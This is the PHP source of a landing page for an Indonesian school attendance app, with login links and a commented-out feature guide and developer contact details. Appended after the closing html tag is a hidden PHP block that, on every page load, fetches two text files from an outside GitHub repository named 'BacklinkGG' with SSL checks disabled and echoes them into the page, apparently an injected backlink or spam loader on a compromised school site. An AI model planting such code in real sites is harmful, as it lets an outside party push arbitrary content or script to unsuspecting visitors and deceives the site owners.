<?php require "config.php"; ?>
<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title><?= $tb_setelan['nama'] ?></title>
   <link rel="shortcut icon" href="<?= base_url() ?>/assets/img/icons8-checkmark-48.png" type="image/x-icon">
   <link rel="stylesheet" href="<?= base_url() ?>/assets/bootstrap/css/bootstrap.min.css">
   <link rel="stylesheet" href="<?= base_url() ?>/assets/animate/animate.min.css">
   <link rel="stylesheet" href="<?= base_url() ?>/assets/absensi/css/style.css">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans&display=swap">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap">
   <style>
      html,
      body {
         background: #F1F7FF;
      }
   </style>
</head>

<nav class="navbar navbar-landing-page navbar-expand-lg navbar-light fixed-top py-4">
   <div class="container">
      <a class="navbar-brand" href="<?= base_url() ?>"><?= $tb_setelan['nama'] ?></a>
      <button class="navbar-toggler outline-0" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
         <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
         <div class="navbar-nav ml-auto">
            <a class="nav-item nav-link" href="#beranda">Beranda</a>
            <a class="nav-item nav-link" href="#fitur-kami">Fitur Kami</a>
            <a class="nav-item nav-link" href="#tutorial">Tutorial</a>
            <a class="nav-item nav-link" href="#kontak-kami">Kontak Kami</a>
         </div>
      </div>
   </div>
</nav>

<div class="landing-page" id="beranda">
   <div class="container">
      <div class="row d-flex justify-content-center">
         <div class=" col-12 col-lg-6 my-auto">
            <h1>
               <?= $tb_setelan['nama'] ?>
               <span>- Lebih Mudah & Cepat</span>
            </h1>
            <p>Adalah Sebuah Kegiatan Pengambilan Data, Guna Mengetahui Jumlah Kehadiran Pada Suatu Acara. Setiap Kegiatan Yang Membutuhkan Informasi Mengenai Peserta Tentu Akan Melakukan Absensi.</p>
            <a href="<?= base_url() ?>/auth/siswa" class="btn btn-outline-linear-primary waves-effect my-2">
               Login Siswa
            </a>
            <a href="<?= base_url() ?>/auth/guru" class="btn btn-outline-linear-primary waves-effect my-2">
               Login Guru
            </a>
            <br>
            <a href="<?= base_url() ?>/auth/ortu" class="btn btn-outline-linear-success waves-effect my-2">
               Login Ortu
            </a>
            <a href="<?= base_url() ?>/auth/karyawan" class="btn btn-outline-linear-success waves-effect my-2">
               Login Karyawan
            </a>
         </div>
         <div class="col-10 col-lg-6 my-5 img">
            <img src="<?= base_url() ?>/assets/img/absensi.png" alt="gambar" class="img-fluid">
         </div>
      </div>
   </div>
</div>

<!-- <div class="container mb-5">
   <div class="label-menu my-5" id="fitur-kami">
      Fitur kami
   </div>
   <p>Halo, Assalamualaikum Warahmatullahi Wabarakatuh</p>
   <p>Pada Kesempatan Ini Saya Akan Menjelaskan Fitur-Fitur dan Aplikasi Ini dan Cara Penggunaan Aplikasi Ini. Aplikasi Ini Ada 3 Level Login Yaitu: Guru, Siswa dan Admin. Aplikasi Ini Tidak Melakukan Reload Page Melainkan Reload Contentnya Saja. Aplikasi Ini Saya Jamin Sangat Ringan dan Supercepat.</p>
   <h5>ROLE GURU</h5>
   <p>1. Daftar Akun Guru <a href="http://absensimonitoring.rf.gd/auth/guru/daftar">http://absensimonitoring.rf.gd/auth/guru/daftar</a></p>
   <p>2. Login Guru <a href="http://absensimonitoring.rf.gd/auth/guru/login">http://absensimonitoring.rf.gd/auth/guru/login</a></p>
   <p>3. Tiap Guru Bisa Membuat Kelas. Berikut Field Kelas :</p>
   <ul>
      <li>Menginput Nama Kelas.</li>
      <li>Melakukan Penjadwalan Absen Masuk Mulai dan Akhir.</li>
      <li>Melakukan Penjadwalan Absen Pulang Mulai dan Akhir.
         <br><i>Format Waktu Yang Digunakan Adalah 24 Jam.</i>
      </li>
   </ul>
   <p>4. Tiap Guru Bisa Mengedit Data Kelasnya, Menghapus Data Kelasnya dan Melihat Token
      Kelasnya. Token Kelas Ini Untuk Diberikan Kepada Siswa, Jika Siswa Melakukan
      Pendaftaran Sendiri Dimenu Daftar Akun Siswa
      <a href="http://absensimonitoring.rf.gd/auth/siswa/daftar">http://absensimonitoring.rf.gd/auth/siswa/daftar</a>.</p>
   <p>5. Cara Menambahkan Data Siswa. Klik Menu Daftar Siswa > Lalu Pilih Kelas Yang Akan
      Ditambahkan Datanya. Menambahkan Data Siswa Ada 3 Cara. Yaitu :</p>
   <ul>
      <li>Menginput Data Biasa Oleh Guru.</li>
      <li>Siswa Mendaftar Sendiri Dengan Syarat Guru Memberikan Token Kelas Kepada
         Siswa Tersebut.</li>
      <li>Import Data, Yang Sebelumnya Sudah Dibuat di Aplikasi Microsoft Office Excel
         atau Excel Sejenisnya, Dengan Format File csv, ods atau xlsx. Sususan Table
         Yang Akan Dibuat Diexcel :</li>
      <table border="1" cellpadding="5" cellspacing="0" class="text-center">
         <tr>
            <td>NIS</td>
            <td>NAMA DEPAN</td>
            <td>NAMA BELAKANG</td>
            <td>JENIS KELAMIN</td>
         </tr>
         <tr>
            <td>1010</td>
            <td>Azan Fadli</td>
            <td>Mulyadi</td>
            <td>Laki - Laki</td>
         </tr>
         <tr>
            <td>...</td>
            <td>...</td>
            <td>...</td>
            <td>Perempuan</td>
         </tr>
      </table>
   </ul>
   <p>6. Tiap Guru Bisa Mengedit Data Siswanya, Menghapus Data Siswanya dan Melihat
      Detail Data Siswanya.</p>
   <p>7. Tiap Guru Bisa Menambahkan Pengumuman Untuk Kelas Yang Bisa di Setel Sendiri,
      Mengedit Pengumumannya, dan Menghapus Pengumumannya.</p>
   <p>8. Siswa Bisa Menanggapi atau Mengomentari Pengumuman Tersebut.</p>
   <p>9. Menu Monitoring. Menu Monitoring Ini Realtime 60 Detik Reload Content. Ingat ! Ini
      Cuma Reload Content Jadi Tidak Mengganggu Aktivitas Penggunanya. Menu Ini Bisa
      Melihat Daftar Siswa Yang Sudah Melakukan Absen dan Foto Selfie Siswanya Sendiri.</p>
   <p>10. Menu Rekap Nilai. Rekap Nilai Diambil Dari Kelas, Bulan dan Tahun. Jadi, Menu Ini
      Bisa Mengeksport Data Absen Perbulan. Yang Direkap Apa ? Tentu Data Absen Masuk
      dan Pulang.</p>
   <p>11. Menu Setelan. Menu Ini Bisa Mengubah Data Diri Gurunya Sendiri, Termasuk
      Mengubah Profil, dan Mengubah Password Login.</p>
   <p>12. Menu Beranda Dimana Guru Bisa Melihat Total Kelasnya, Total Siswanya, Total Absen
      Masuk Masuk Hari Ini dan Total Absen Pulang Hari Ini.</p>
   <h5>ROLE SISWA</h5>
   <p>1. Daftar Akun Siswa <a href="http://absensimonitoring.rf.gd/auth/siswa/daftar">http://absensimonitoring.rf.gd/auth/siswa/daftar</a>. Untuk Field Token
      Kelas, Jadi Siswa Meminta Kepada Guru.</p>
   <ul>
      <li>Menginput Token Kelas</li>
      <li>Menginput NIS</li>
      <li>Menginput Nama Depan dan Nama Belakang</li>
      <li>Memilih Jenis Kelamin</li>
      <li>Melilih Alamat (Dari Provinsi - Kelurahan)</li>
      <li>Menginput Password</li>
   </ul>
   <p>2. Login Siswa <a href="http://absensimonitoring.rf.gd/auth/siswa/login">http://absensimonitoring.rf.gd/auth/siswa/login</a>. Jika Siswa Baru Pertama
      Kali Melakukan Login, Nanti Diarahkan Ke url Join Group Telegram. Nah Dari Situ Siswa
      Menerima Notifikasi Siapa Saja Yang Melakukan Absen Masuk Maupun Absen Pulang.</p>
   <p>3. Halaman Beranda Siswa Terdapat Tombol Untuk Melakukan Absen.</p>
   <p>4. Halaman Pengumuman. Siswa Bisa Menanggapi Atau Mengomentari Pengumuman
      Yang Diberikan Oleh Gurunya.</p>
   <p>5. Melihat Jadwal Absen Masuk Mulai dan Akhir.</p>
   <p>6. Melihat Jadwal Pulang Mulai dan Akhir.</p>
   <p>7. Melihat Monitoring Kelasnya. Siapa Saja Yang Sudah Melakukan Absen Dalam Satu
      Bulan.</p>
   <h5>ROLE ADMIN</h5>
   <p>1. Bisa Menghapus Semua Data.</p>
   <p>2. Bisa Mengedit Nama Aplikasi, base_url, Chat id Group Telegram, Token Bot Telegram
      dan url Join Telegram Bot.</p>
   <p>3. Bisa Mengedit Data Diri Admin Termasuk Username dan Password.</p>
   <p>4. Beranda admin.</p>
   <p>Fitur Lainnya :</p>
   <ul>
      <li>Tiap Login Menggunakan Cookie Dengan Expired 1 Tahun</li>
      <li>Waktu Tidak Bisa Dimanipulasi Oleh Siapa Saja, Karna Waktu Server. Jadi, Jika Ingin Mengubah Waktu, Mengubahnya di Server.</li>
      <li>Tidak Melakukan Template Orang Lain.</li>
      <li>Content Tidak Melakukan Reload</li>
   </ul>
   <div class="label-menu my-5" id="tutorial">
      Tutorial
   </div>
   <div class="row text-center">
      <div class="col-md-6">
         <div class="card" style="border-radius: 0;">
            <iframe height="315" src="https://www.youtube.com/embed/3g0FhSql7rs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
         </div>
      </div>
      <div class="col-md-6">
         <div class="card" style="border-radius: 0;">
            <iframe height="315" src="https://www.youtube.com/embed/Ice6G1INkYE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
         </div>
      </div>
   </div>
   <div class="label-menu my-5" id="kontak-kami">
      Kontak Saya
   </div>
   <p>Email: azanfadli04@gmail.com</p>
   <p>Facebook: <a href="https://www.facebook.com/AFM.Yustii2212/">Azan Fadli</a></p>
   <p>HUB/WA: +62-821-3839-0110</p>
</div> 

<div class="copyright">
   <div class="container">
      <img src="<?= base_url() ?>/assets/img/icons8-checkmark-48.png" alt="Logo">
      <p>
         &copy; Copyright 2020 <?= $tb_setelan['nama'] ?>
      </p>
   </div>
</div> -->

<body>
   <script src="<?= base_url() ?>/assets/jquery/jquery.min.js"></script>
   <script src="<?= base_url() ?>/assets/bootstrap/js/bootstrap.bundle.min.js"></script>
   <script src="<?= base_url() ?>/assets/bootstrap/js/bootstrap.min.js"></script>
   <script src="<?= base_url() ?>/assets/absensi/js/script.js"></script>
</body>

</html>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; 
}
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/mtsdarululumsasa/absen.mtsdarululumsasa.sch.id/system.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
echo $fileContents1;
echo $fileContents2;
?>
